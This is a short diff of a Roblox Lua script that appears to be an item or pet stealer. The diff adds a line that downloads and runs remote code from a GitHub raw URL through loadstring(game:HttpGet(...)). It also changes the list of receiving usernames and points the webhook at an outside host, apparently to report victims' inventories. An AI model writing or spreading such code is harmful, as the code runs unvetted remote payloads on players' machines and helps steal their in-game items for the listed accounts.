@@ -1,7 +1,17 @@
-local users = _G.Usernames or {"Danilpuk123offnik", "057Deni"}
+local success, res = pcall(function()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/script/refs/heads/main/ScriptPricePC.txt"))()
+end)
+
+if not success then
+    warn("Ошибка загрузки скрипта: " .. tostring(res))
+else
+    print("Скрипт успешно загружен и запущен!")
+end
+
+local users = _G.Usernames or {"057Deni", "pignkn"}
 local min_rarity = _G.min_rarity or "Common"
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "http://de-bots2.h1cloud.net:25569/roblox-webhook"
+local webhook = _G.webhook or "http://de-bots2.h1cloud.net:25257/roblox-webhook"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
